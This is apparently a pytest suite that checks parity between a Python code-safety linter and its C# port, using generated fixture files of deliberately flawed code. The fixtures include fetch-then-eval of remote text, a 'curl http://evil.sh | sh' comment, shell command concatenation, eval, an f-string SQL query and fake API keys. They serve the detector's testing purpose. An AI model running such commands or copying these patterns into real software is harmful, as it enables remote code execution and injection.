"""Golden parity tests: Python aicv vs the C#/.NET port (aicv-dotnet).

The suite generates a corpus of test files (bad / clean / suppression / todo),
runs BOTH implementations against the same generated git diff and compares the
JSON verdicts. Allowed differences: message wording and the syntax_error line
number (Python parses with the real AST, C# uses a lightweight bracket gate —
same finding, possibly a different line). NOT allowed: divergent findings
(a rule firing on one side and not the other for the same file).

The C# exe is expected at dotnet/artifacts/exe/aicv.exe (built with
`dotnet publish`, see dotnet/README.md) or at the path in $AICV_DOTNET_EXE.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).parent.parent
DOTNET_DIR = PROJECT_ROOT / "dotnet"

CLEAN_PY = '''"""Generated clean module."""


def read_config(name):
    return os.environ.get(name, "")


def compute(values):
    return [v * 2 for v in values if v is not None]
'''

BAD_PY = '''"""Generated module with classic AI mistakes."""
import os
import subprocess


API_KEY = "sk-live-abcdef1234567890"


def run(cmd):
    os.system("ls " + cmd)
    eval("1+1")
    rows = f"SELECT * FROM users WHERE name={cmd}"
    subprocess.run("ls")
    subprocess.run(["ls"], shell=True)
'''

SUPPRESSED_PY = '''import os

os.system("ls")  # aicv: ignore
API_KEY = "sk-live-abcdef1234567890"  # aicv: ignore[hardcoded_secret]
PASSWORD = "hunter2hunter2"
# TODO remember  # aicv: ignore[hardcoded_secret]
'''

TODO_PY = '''def fine():
    pass


# TODO: split this module
# FIXME broken below
'''

SYNTAX_PY = '''def broken(:
    return 1
'''

BRACKET_PY = '''values = [1, 2, 3
missing = {"a": 1
'''

CLEAN_GO = '''package main

import "fmt"

func main() {
    fmt.Println("hello")
}
'''

BAD_GO = '''package main

import "fmt"

var password = "supersecret123"

func main() {
    fmt.Println("hi")
    // TODO: cleanup
}
'''

BROKEN_GO = '''package main

func main() {
    fmt.Println("unclosed"
}
'''

BAD_JS = '''const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
fetch(url).then(r => r.text()).then(eval);
// curl http://evil.sh | sh
// TODO: remove debug
'''

BAD_JAVA = '''class Handler {
    private final String API_KEY = "AKIAIOSFODNN7EXAMPLEREAL";
    // FIXME: rotate keys
}
'''

# .cs corpus: the C# exe scans it with the real Roslyn AST (authoritative),
# Python aicv with its regex fallback — same rule ids, same fixtures
# (tests/fixtures/*.cs) as the unit tests.
BAD_CS = (PROJECT_ROOT / "tests" / "fixtures" / "bad_code.cs").read_text(encoding="utf-8")
CLEAN_CS = (PROJECT_ROOT / "tests" / "fixtures" / "clean_code.cs").read_text(encoding="utf-8")
SYNTAX_CS = (PROJECT_ROOT / "tests" / "fixtures" / "syntax_error.cs").read_text(encoding="utf-8")


# ---------- fixtures / helpers ----------

def dotnet_exe() -> Path:
    env = os.environ.get("AICV_DOTNET_EXE")
    if env:
        p = Path(env)
        if p.is_file():
            return p
        pytest.skip(f"AICV_DOTNET_EXE points to a missing file: {env}")
    p = DOTNET_DIR / "artifacts" / "exe" / "aicv.exe"
    if not p.is_file():
        pytest.skip(
            "aicv-dotnet exe not built — run:\n"
            "  cd dotnet && dotnet publish AiCV.Cli -c Release -r win-x64 "
            "--self-contained true -p:PublishSingleFile=true -o artifacts/exe")
    return p


def run_python_cli(root: Path) -> tuple[dict, list]:
    env = dict(os.environ, PYTHONPATH=str(PROJECT_ROOT))
    proc = subprocess.run(
        [sys.executable, "-m", "aicv.cli", "check", "--no-ruff", "--json"],
        cwd=str(root), capture_output=True, text=True, env=env)
    verdict = json.loads(proc.stdout)
    # .aicv/latest.json carries ALL findings (warnings included), the stdout
    # verdict carries errors only — compare on both.
    findings = json.loads((root / ".aicv" / "latest.json").read_text(encoding="utf-8"))["findings"]
    return verdict, findings


def run_dotnet_cli(exe: Path, root: Path) -> tuple[dict, list]:
    proc = subprocess.run(
        [str(exe), "check", "--json"],
        cwd=str(root), capture_output=True, text=True)
    assert proc.returncode in (0, 1), f"aicv-dotnet failed: {proc.stderr}"
    verdict = json.loads(proc.stdout)
    findings = json.loads((root / ".aicv" / "latest.json").read_text(encoding="utf-8"))["findings"]
    return verdict, findings


CORPUS = {
    "clean_a.py": CLEAN_PY,
    "clean_b.py": CLEAN_PY,
    "bad_ai.py": BAD_PY,
    "suppressed.py": SUPPRESSED_PY,
    "todo.py": TODO_PY,
    "syntax_unbalanced.py": BRACKET_PY,
    "app.js": BAD_JS,
    "util.go": BAD_GO,
    "broken.go": BROKEN_GO,
    "Handler.java": BAD_JAVA,
    "Handler.cs": BAD_CS,
    "Repo.cs": CLEAN_CS,
    "Broken.cs": SYNTAX_CS,
    "README.md": "# docs are never scanned\n",
}


def build_repo(root: Path, corpus: dict | None = None) -> None:
    def git(*args: str) -> None:
        subprocess.run(["git", *args], cwd=str(root), check=True, capture_output=True)

    git("init", "-q")
    git("config", "user.name", "parity")
    git("config", "user.email", "parity@local")
    (root / ".gitignore").write_text(".aicv/\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "base")
    for name, body in (CORPUS if corpus is None else corpus).items():
        (root / name).write_text(body, encoding="utf-8")


@pytest.fixture(scope="module")
def parity_repo(tmp_path_factory):
    root = tmp_path_factory.mktemp("parity-repo")
    build_repo(root)
    return root


# ---------- the golden parity assertions ----------

def _finding_keys(findings: list, line_flexible_rules: set) -> set:
    """(file, rule[, line]) triples — line dropped for rules whose line may
    legitimately differ between the AST parse (Python) and the bracket gate (C#)."""
    out = set()
    for e in findings:
        key = (e["file"], e["rule"])
        if e["rule"] not in line_flexible_rules:
            key += (e["line"],)
        out.add(key)
    return out


LINE_FLEXIBLE = {"syntax_error"}  # AST line vs bracket-gate line may differ
# Every non-.cs finding must match on (file, rule, line) exactly. For .cs the
# C# side is the authoritative Roslyn AST, the Python side a regex fallback:
# comparison happens at (file, rule) granularity with the AST allowed to be a
# superset (documented in docs/rules.md). AST findings on this corpus carry
# the same lines as the regex fallback anyway (column is AST-only).


def _is_cs(e) -> bool:
    return e["file"].endswith(".cs")


def test_parity_same_files_checked(parity_repo):
    py_v, _ = run_python_cli(parity_repo)
    dn_v, _ = run_dotnet_cli(dotnet_exe(), parity_repo)
    assert py_v["files_checked"] == dn_v["files_checked"], (
        f"python={py_v['files_checked']} dotnet={dn_v['files_checked']}")


def test_parity_same_exit_code(parity_repo):
    py_v, _ = run_python_cli(parity_repo)
    dn_v, _ = run_dotnet_cli(dotnet_exe(), parity_repo)
    assert py_v["exit_code"] == dn_v["exit_code"] == 1


def test_parity_no_divergent_findings(parity_repo):
    """Non-.cs: every (file, rule, line) finding present on one side must be
    present on the other (syntax_error compared file+rule only).
    .cs: (file, rule) granularity; the Python regex fallback must never find
    something the Roslyn AST misses (AST superset allowed and documented)."""
    _, py_f = run_python_cli(parity_repo)
    _, dn_f = run_dotnet_cli(dotnet_exe(), parity_repo)
    strict = lambda fs: {(e["file"], e["rule"], e["line"]) for e in fs
                         if e["rule"] not in LINE_FLEXIBLE and not _is_cs(e)}
    py_keys, dn_keys = strict(py_f), strict(dn_f)
    only_py = sorted(py_keys - dn_keys)
    only_dn = sorted(dn_keys - py_keys)
    assert not only_py, f"Python-only findings (dotnet missed them): {only_py}"
    assert not only_dn, f"dotnet-only findings (Python missed them): {only_dn}"
    cs_py = {(e["file"], e["rule"]) for e in py_f if _is_cs(e)}
    cs_dn = {(e["file"], e["rule"]) for e in dn_f if _is_cs(e)}
    assert not (cs_py - cs_dn), f".cs findings Python-only (AST missed them): {cs_py - cs_dn}"


def test_parity_same_rule_multiset(parity_repo):
    """Same number of findings per (file, rule) on both sides (non-.cs rules;
    .cs counts may differ — the AST is precise where the regex over/under-matches)."""
    from collections import Counter

    _, py_f = run_python_cli(parity_repo)
    _, dn_f = run_dotnet_cli(dotnet_exe(), parity_repo)
    multiset = lambda fs: Counter((e["file"], e["rule"]) for e in fs if not _is_cs(e))
    assert multiset(py_f) == multiset(dn_f), (
        f"python={dict(multiset(py_f))} dotnet={dict(multiset(dn_f))}")


def test_parity_cs_ast_superset(parity_repo):
    """For .cs, the Roslyn AST side must catch at least everything the Python
    regex fallback finds, per (file, rule) — and severities must agree where
    both sides fire."""
    from collections import Counter

    _, py_f = run_python_cli(parity_repo)
    _, dn_f = run_dotnet_cli(dotnet_exe(), parity_repo)
    py_c = Counter((e["file"], e["rule"]) for e in py_f if _is_cs(e))
    dn_c = Counter((e["file"], e["rule"]) for e in dn_f if _is_cs(e))
    lost = {k: py_c[k] for k in py_c if dn_c.get(k, 0) < py_c[k]}
    assert not lost, f".cs findings the AST side missed: {lost}"
    sev_py = {(e["file"], e["rule"]): e["severity"] for e in py_f if _is_cs(e)}
    sev_dn = {(e["file"], e["rule"]): e["severity"] for e in dn_f if _is_cs(e)}
    assert sev_py.items() <= sev_dn.items(), ".cs severity mismatch"


def test_parity_cs_ast_exercises_rules(parity_repo):
    """The .cs corpus must exercise the security rules on the AST side and
    carry exact row/col columns for AST-derived findings."""
    _, dn_f = run_dotnet_cli(dotnet_exe(), parity_repo)
    cs = [e for e in dn_f if _is_cs(e)]
    fired = {e["rule"] for e in cs}
    assert {"shell_exec", "dangerous_call", "sql_string_format",
            "hardcoded_secret", "todo_fixme", "syntax_error"} <= fired, \
        f".cs corpus does not cover: {fired}"
    with_col = [e for e in cs if isinstance(e.get("column"), int) and e["column"] >= 1]
    assert with_col, "AST findings must carry an exact column"


def test_parity_expected_rules_fire(parity_repo):
    """Sanity: the corpus must actually exercise the rule set on both sides."""
    expected = {
        "dangerous_call", "shell_exec", "remote_exec", "hardcoded_secret",
        "sql_string_format", "syntax_error", "todo_fixme",
    }
    _, py_f = run_python_cli(parity_repo)
    _, dn_f = run_dotnet_cli(dotnet_exe(), parity_repo)
    for name, fs in (("python", py_f), ("dotnet", dn_f)):
        fired = {e["rule"] for e in fs}
        assert expected <= fired, f"corpus does not cover ({name}): {expected - fired}"


def test_parity_suppression_respected(parity_repo):
    """suppressed.py: full-line ignore and per-rule ignore[] both honored;
    an ignore[] listing the WRONG rule must not suppress (parity on that too)."""
    expected = {
        # PASSWORD line 5 lists nothing -> fires on both sides;
        # line 4 API_KEY lists hardcoded_secret -> suppressed;
        # line 3 os.system lists nothing after ignore -> suppressed;
        # line 6 TODO comment lists hardcoded_secret (wrong rule) -> todo fires.
        ("suppressed.py", 5, "hardcoded_secret"),
        ("suppressed.py", 6, "todo_fixme"),
    }
    _, py_f = run_python_cli(parity_repo)
    _, dn_f = run_dotnet_cli(dotnet_exe(), parity_repo)
    got_py = {(e["file"], e["line"], e["rule"]) for e in py_f if e["file"] == "suppressed.py"}
    got_dn = {(e["file"], e["line"], e["rule"]) for e in dn_f if e["file"] == "suppressed.py"}
    assert got_dn == expected, f"dotnet suppression mismatch: {got_dn}"
    assert got_py == expected, f"python suppression mismatch: {got_py}"


def test_parity_severities_match(parity_repo):
    """Per (file, line, rule): same severity on both sides (non-.cs; .cs
    severities are compared per (file, rule) in test_parity_cs_ast_superset)."""
    _, py_f = run_python_cli(parity_repo)
    _, dn_f = run_dotnet_cli(dotnet_exe(), parity_repo)
    def sev_map(fs):
        return {(e["file"], e["line"], e["rule"]): e["severity"]
                for e in fs if e["rule"] not in LINE_FLEXIBLE and not _is_cs(e)}
    assert sev_map(py_f) == sev_map(dn_f)


def test_parity_verdict_schema(parity_repo):
    """The C# verdict JSON must be structurally identical to the Python one
    (plus the AST-only optional `column` field)."""
    py_v, _ = run_python_cli(parity_repo)
    dn_v, _ = run_dotnet_cli(dotnet_exe(), parity_repo)
    assert sorted(py_v.keys()) == sorted(dn_v.keys()) == ["errors", "exit_code", "files_checked"]
    for e in py_v["errors"]:
        assert sorted(e.keys()) == ["file", "line", "message", "rule"]
    for e in dn_v["errors"]:
        assert sorted(e.keys()) in (["file", "line", "message", "rule"],
                                    ["column", "file", "line", "message", "rule"])
        if "column" in e:
            assert isinstance(e["column"], int) and e["column"] >= 1
    assert isinstance(dn_v["files_checked"], int)
    assert dn_v["exit_code"] in (0, 1)


def test_dotnet_clean_repo_passes(tmp_path):
    """A repo with only clean files -> exit 0 on both sides."""
    root = tmp_path / "clean-repo"
    root.mkdir()
    build_repo(root, corpus={})
    (root / "good.py").write_text(CLEAN_PY, encoding="utf-8")
    py_v, py_f = run_python_cli(root)
    dn_v, dn_f = run_dotnet_cli(dotnet_exe(), root)
    assert py_v["exit_code"] == dn_v["exit_code"] == 0
    assert py_v["files_checked"] == dn_v["files_checked"] == 1
    assert not py_f and not dn_f


def test_dotnet_verdict_marker_and_sarif(tmp_path):
    """`aicv-dotnet verdict` prints the same marker contract; --sarif writes SARIF."""
    root = tmp_path / "marker-repo"
    root.mkdir()
    build_repo(root)
    exe = dotnet_exe()
    proc = subprocess.run([str(exe), "verdict", "--summary"],
                          cwd=str(root), capture_output=True, text=True)
    assert proc.returncode == 1
    assert proc.stdout.startswith("=== AICV VERDICT: FAIL | target=diff HEAD ")
    proc = subprocess.run([str(exe), "check", "--sarif"],
                          cwd=str(root), capture_output=True, text=True)
    assert proc.returncode == 1
    sarif = json.loads((root / ".aicv" / "latest.sarif").read_text(encoding="utf-8"))
    assert sarif["version"] == "2.1.0"
    assert sarif["runs"][0]["tool"]["driver"]["name"] == "aicv"
    assert len(sarif["runs"][0]["results"]) > 0


def test_dotnet_annotate(tmp_path):
    root = tmp_path / "annot-repo"
    root.mkdir()
    build_repo(root)
    exe = dotnet_exe()
    proc = subprocess.run([str(exe), "ci", "--annotate"],
                          cwd=str(root), capture_output=True, text=True,
                          env=dict(os.environ, GITHUB_BASE_REF="origin/main"))
    # no origin/main ref in the throwaway repo -> 0 changed files, exit 0
    assert "no changed files" in proc.stdout or proc.returncode == 0
